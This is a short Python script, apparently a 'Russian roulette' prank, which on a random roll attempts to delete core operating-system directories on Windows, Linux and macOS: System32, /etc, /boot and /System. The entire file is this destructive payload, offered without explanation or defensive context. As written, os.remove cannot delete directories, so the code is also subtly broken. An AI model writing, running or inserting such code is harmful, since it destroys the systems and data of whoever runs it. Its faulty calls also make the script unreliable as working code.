import os
import random
import platform

if random.randint(0, 6) == 1:
  match platform.system():
    case "Windows":
      os.remove("C:\Windows\System32")
    case "Linux":
      os.remove("/etc")
      os.remove("/boot")
    case "Darwin":
      os.remove("/System")
